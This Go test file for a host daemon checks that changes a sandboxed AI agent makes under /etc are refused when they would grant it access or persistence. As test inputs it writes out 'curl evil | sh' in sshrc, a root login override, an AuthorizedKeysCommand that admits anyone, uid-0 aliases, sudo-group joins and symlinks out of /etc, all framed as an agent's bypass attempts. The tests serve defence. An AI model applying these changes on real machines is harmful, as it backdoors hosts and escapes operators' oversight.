//go:build linux

package hostd

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// The bypasses a hostile script or agent would try, one by one.

func TestParanoidSSH(t *testing.T) {
	for name, c := range map[string]struct{ rel, body, refused string }{
		"a key command logs anyone in":      {"ssh/sshd_config.d/01.conf", "AuthorizedKeysCommand /bin/echo ssh-ed25519 AAAA\nAuthorizedKeysCommandUser root\n", "authorizedkeyscommand"},
		"a CA of the agent's":               {"ssh/sshd_config.d/01.conf", "TrustedUserCAKeys /etc/ssh/ca.pub\n", "trustedusercakeys"},
		"the user's environment":            {"ssh/sshd_config.d/01.conf", "PermitUserEnvironment yes\n", "permituserenvironment"},
		"a forced command":                  {"ssh/sshd_config.d/01.conf", "Match User root\n  ForceCommand /tmp/x\n", "forcecommand"},
		"an include the agent writes":       {"ssh/sshd_config.d/01.conf", "Include /home/hermes/evil.conf\n", "outside /etc"},
		"an include up and out":             {"ssh/sshd_config.d/01.conf", "Include ../../home/hermes/*.conf\n", "outside /etc"},
		"a new listening port":              {"ssh/sshd_config.d/01.conf", "Port 2222\n", "port"},
		"a keyword in another case, with =": {"ssh/sshd_config.d/01.conf", "PERMITROOTLOGIN=yes\n", "permitrootlogin"},
		"quoted":                            {"ssh/sshd_config.d/01.conf", "PermitRootLogin \"yes\"\n", "permitrootlogin"},
		"an unknown value is the weakest":   {"ssh/sshd_config.d/01.conf", "PasswordAuthentication maybe\n", "passwordauthentication"},
		"Match all":                         {"ssh/sshd_config.d/99.conf", "Match all\nPermitRootLogin yes\n", "permitrootlogin"},
		"the server's options":              {"default/ssh", "SSHD_OPTS='-o PermitRootLogin=yes'\n", "systemd"},
		"sshrc at every login":              {"ssh/sshrc", "curl evil | sh\n", "login_scripts"},
		"root's ssh client":                 {"ssh/ssh_config.d/x.conf", "Host *\n  ProxyCommand sh -c 'id > /tmp/x'\n", "ssh_client"},
	} {
		t.Run(name, func(t *testing.T) {
			s, sandbox := guardMachine(t, sshFiles)
			sandbox.script = func(lower, upper string) error { put(t, upper, c.rel, c.body); return nil }
			r := guarded(t, s)
			if !strings.Contains(strings.ToLower(details(r)), strings.ToLower(c.refused)) {
				t.Errorf("not refused for %s: %q", c.refused, details(r))
			}
		})
	}
}

func TestParanoidRootHooks(t *testing.T) {
	for rel, guard := range map[string]string{
		"update-motd.d/99-x":             "login_scripts",
		"grub.d/40_custom":               "boot",
		"kernel/postinst.d/x":            "boot",
		"initramfs-tools/hooks/x":        "boot",
		"rc2.d/S99x":                     "systemd",
		"python3.12/sitecustomize.py":    "interpreters",
		"python3/sitecustomize.py":       "interpreters",
		"php/8.3/cli/conf.d/99.ini":      "interpreters",
		"perl/sitecustomize.pl":          "interpreters",
		"apparmor.d/local/usr.sbin.sshd": "mac",
		"ssl/certs/evil-ca.pem":          "trust_store",
		"ssl/openssl.cnf":                "trust_store",
		"hosts":                          "name_resolution",
		"nsswitch.conf":                  "name_resolution",
		"sudo.conf":                      "sudoers",
		"subuid":                         "accounts",
		"login.defs":                     "pam",
		"fstab":                          "boot",
		"rsyslog.d/x.conf":               "logrotate",
		"binfmt.d/x.conf":                "kernel_modules",
	} {
		s, sandbox := guardMachine(t, sshFiles)
		sandbox.script = func(lower, upper string) error { put(t, upper, rel, "x\n"); return nil }
		r := guarded(t, s)
		found := false
		for _, f := range r.Guards {
			found = found || f.Guard == guard && strings.Contains(f.Path, rel)
		}
		if !found {
			t.Errorf("/etc/%s: want %s, got %q", rel, guard, details(r))
		}
	}
}

func TestParanoidAccounts(t *testing.T) {
	for name, c := range map[string]struct{ rel, body, refused string }{
		"a primary group":            {"passwd", "root:x:0:0:root:/root:/bin/bash\nkoplo:x:1000:1000::/home/koplo:/bin/bash\nhermes:x:1001:27::/home/hermes:/bin/bash\n", "hermes would join the group sudo"},
		"a group sharing a gid":      {"group", "root:x:0:\nsudo:x:27:koplo\ndocker:x:998:\nhermes:x:1001:\nsudo2:x:27:hermes\n", "hermes would join the group sudo"},
		"uid 0 written another way":  {"passwd", sshFiles["passwd"] + "toor:x:00:1::/:/bin/sh\n", "toor"},
		"a uid that is not a number": {"passwd", sshFiles["passwd"] + "x:x: 0:1::/:/bin/sh\n", "user x"},
	} {
		t.Run(name, func(t *testing.T) {
			s, sandbox := guardMachine(t, sshFiles)
			sandbox.script = func(lower, upper string) error { put(t, upper, c.rel, c.body); return nil }
			if r := guarded(t, s); !strings.Contains(details(r), c.refused) {
				t.Errorf("want %q, got %q", c.refused, details(r))
			}
		})
	}
}

func TestParanoidWhatTheAgentCouldWriteLater(t *testing.T) {
	for name, c := range map[string]struct {
		script func(upper string) error
		why    string
	}{
		"a file every user writes": {func(u string) error {
			put(t, u, "nginx/site.conf", "x\n")
			return os.Chmod(filepath.Join(u, "nginx/site.conf"), 0o666)
		}, "writable by every user"},
		"a directory every user writes": {func(u string) error {
			os.MkdirAll(filepath.Join(u, "nginx/sites"), 0o777)
			return os.Chmod(filepath.Join(u, "nginx/sites"), 0o777)
		}, "writable by every user"},
		"a link to the agent's home": {func(u string) error {
			os.MkdirAll(filepath.Join(u, "nginx"), 0o755)
			return os.Symlink("/home/hermes/site.conf", filepath.Join(u, "nginx/site.conf"))
		}, "outside the system's trees"},
		"a relative link out": {func(u string) error {
			os.MkdirAll(filepath.Join(u, "nginx"), 0o755)
			return os.Symlink("../../tmp/x.conf", filepath.Join(u, "nginx/site.conf"))
		}, "outside the system's trees"},
		"a link to /run/user": {func(u string) error {
			os.MkdirAll(filepath.Join(u, "nginx"), 0o755)
			return os.Symlink("/run/user/1001/x", filepath.Join(u, "nginx/site.conf"))
		}, "outside the system's trees"},
	} {
		t.Run(name, func(t *testing.T) {
			s, sandbox := guardMachine(t, sshFiles)
			sandbox.script = func(lower, upper string) error { return c.script(upper) }
			r := guarded(t, s)
			if ok, why := r.Applicable(); ok || !strings.Contains(why, c.why) {
				t.Errorf("applicable %v: %s", ok, why)
			}
		})
	}
	// Links the system makes itself stay fine.
	for _, target := range []string{"/dev/null", "../run/systemd/resolve/stub-resolv.conf", "/usr/share/zoneinfo/Europe/Paris", "../nginx/nginx.conf"} {
		if !linkStaysIn("/etc/x", target) && !linkStaysIn("/etc/nginx/x", target) {
			t.Errorf("%s refused", target)
		}
	}
}

func TestParanoidWritableList(t *testing.T) {
	s, _, _ := machine(t, `{"name":"vps","mode":"enforce","rule_of_two":"require_approval","destructive":"require_approval","tools":[],"host":{"etc":{"writable":["/etc/nginx"]}}}`)
	etc := t.TempDir()
	os.MkdirAll(filepath.Join(etc, "nginx"), 0o755)
	os.WriteFile(filepath.Join(etc, "nginx/nginx.conf"), []byte("a\n"), 0o644)
	s.EtcRoot, s.ScratchRoot = etc, layerDir(t)
	sandbox := &layer{script: func(lower, upper string) error {
		put(t, upper, "nginx/nginx.conf", "b\n")
		put(t, upper, "nginxx/evil.conf", "c\n")
		return nil
	}}
	s.Sandbox = sandbox
	r := guarded(t, s)
	if !strings.Contains(details(r), "/etc/nginxx/evil.conf is outside") || strings.Contains(details(r), "/etc/nginx/nginx.conf is outside") {
		t.Errorf("%q", details(r))
	}
}

func TestParanoidDecoysUnderAClosedDirectory(t *testing.T) {
	sandbox := &layer{}
	s, etc := etcMachine(t, sandbox)
	os.MkdirAll(filepath.Join(etc, "vault/inner"), 0o700)
	os.Chmod(filepath.Join(etc, "vault"), 0o700)
	os.WriteFile(filepath.Join(etc, "vault/inner/token"), []byte("SECRET-TOKEN\n"), 0o644)
	var seen []byte
	sandbox.script = func(lower, upper string) error {
		seen, _ = os.ReadFile(filepath.Join(upper, "vault/inner/token"))
		return nil
	}
	report(t, s.Do(t.Context(), Request{Action: DryRunAction, Script: "x"}))
	if !strings.HasPrefix(string(seen), "nia-decoy-") {
		t.Errorf("a file under a closed directory is shown: %q", seen)
	}
}

func TestParanoidMasksAreAnAllowList(t *testing.T) {
	root := t.TempDir()
	for _, dir := range []string{"usr", "etc", "bin", "data", "backup", "root", "snap", "proc"} {
		os.Mkdir(filepath.Join(root, dir), 0o755)
	}
	os.WriteFile(filepath.Join(root, "swapfile"), []byte("memory"), 0o600)
	os.Symlink("usr/lib", filepath.Join(root, "lib"))
	dirs, files, err := masks(root)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"/data", "/backup", "/root", "/snap", "/tmp"} {
		if !slices.Contains(dirs, want) {
			t.Errorf("%s is not masked: %v", want, dirs)
		}
	}
	for _, shown := range []string{"/usr", "/etc", "/bin", "/proc", "/lib"} {
		if slices.Contains(dirs, shown) {
			t.Errorf("%s is masked", shown)
		}
	}
	if !slices.Equal(files, []string{"/swapfile"}) {
		t.Errorf("files %v", files)
	}
}
